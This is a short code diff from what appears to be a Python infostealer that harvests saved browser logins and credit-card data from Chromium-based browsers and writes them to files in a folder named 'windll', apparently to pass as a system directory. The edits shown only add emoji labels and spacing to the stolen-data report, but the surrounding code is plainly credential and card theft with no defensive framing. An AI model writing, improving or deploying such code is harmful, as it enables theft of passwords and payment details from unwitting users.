@@ -56,6 +56,7 @@ names = [
 
 class Browsers:
     def __init__(self):
+        listData.append("\n**🌐Browsers🌐**")
         Chromium()
     def Return():
         return listData
@@ -72,7 +73,7 @@ class Upload:
         print(names[browsersCounter])
         if logins:
             if not self.Colected:
-                listData.append("\n"+names[browsersCounter])
+                listData.append("\n🔍"+names[browsersCounter])
             self.Colected = True
             print ("logins")
             with open(rf"{pathf}\windll\Browsers\{names[browsersCounter]}\logins.txt", "w", encoding="utf-8") as f:
@@ -116,6 +117,8 @@ class Upload:
             with open(rf"{pathf}\windll\Browsers\{names[browsersCounter]}\cards.txt", "w", encoding="utf-8") as f:
                 f.write(cards)
             listData.append("\n∟💳cards")
+        if self.Colected:
+            listData.append("\n")
 
 '''
 class FireFox:
